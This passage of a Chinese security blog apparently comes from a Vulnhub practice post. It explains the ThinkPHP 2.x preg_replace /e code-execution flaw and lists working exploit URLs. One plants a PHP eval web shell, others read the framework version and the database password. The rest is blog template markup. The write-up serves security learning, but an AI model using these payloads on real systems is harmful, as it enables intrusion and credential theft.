+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$res = preg_replace(&#x27;@(\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\/]+)@e&#x27;, &#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;, implode($depr,$paths));</span><br><span class="line">           $_GET   =  array_merge($var,$_GET);</span><br></pre></td></tr></table></figure>
+
+<p>主要分析一下这个正则  这个 $depr 是  分隔符 <code>/</code>  （\w+） 匹配数字字母下划线</p>
+<p><code>([^&#39;.$depr.&#39;\/]+)</code> 这个匹配除了 <code>/</code>  以外的字符   <code>$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;</code>是反引用</p>
+<p>匹配第一个元组 和第二个元组的内容   <code>implode($depr,$paths)</code>用 <code>/</code> 分隔$paths</p>
+<p>整个匹配就是 比如  a/b/c/d     结果是 $var[a]=b   $var[c]=d 然后 eval执行</p>
+<p>preg_replace函数e修饰符会将第二个参数当作代码执行，后面赋值时结合双引号执行变量，造成代码执行。</p>
+<p><strong>需要说明的是，代码执行的位置，必须是数组的值的位置而不是键的位置。</strong></p>
+<p>我这里直接打payload了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://site/index.php?s=/index/index/name/$%7B@phpinfo()%7D  即可执行phpinfo();</span><br><span class="line"></span><br><span class="line">http://site/index.php/module/action/param1/&#123;$&#123;eval($_POST[s])&#125;&#125;          //一句话密码:s </span><br><span class="line"></span><br><span class="line">http://site/index.php/module/action/param1/$&#123;@print(THINK_VERSION)&#125;       //查看版本</span><br><span class="line"></span><br><span class="line">http://site/index.php/module/action/param1/$&#123;@print(C(‘DB_PASS’))&#125;     //查看数据库密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wh1tecell\AppData\Roaming\Typora\typora-user-images\image-20210623145238468.png" alt="image-20210623145238468"></p>
+<p>复现细节参:<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/223149.html">https://www.freebuf.com/sectool/223149.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://lazylife.top/2019/11/21/THINKPHP2-X-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/">https://lazylife.top/2019/11/21/THINKPHP2-X-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0wn/p/13019858.html">https://www.cnblogs.com/Cl0wn/p/13019858.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/g0udan/p/12252383.html">https://www.cnblogs.com/g0udan/p/12252383.html</a></p>
+<h2 id="ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞"></a>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</h2> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/06/17/Vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/06/22/%E5%9B%BD%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%89%8Dawd%E8%AE%B0%E5%BD%95/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            2021国赛半决赛前awd记录
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/06/14/CVE-2016-6663-CVE-2016-6664%E7%BB%84%E5%90%88%E5%AE%9E%E8%B7%B5%E2%80%9D/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">mysql提权之CVE-2016-6663+CVE-2016-6664组合实践</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
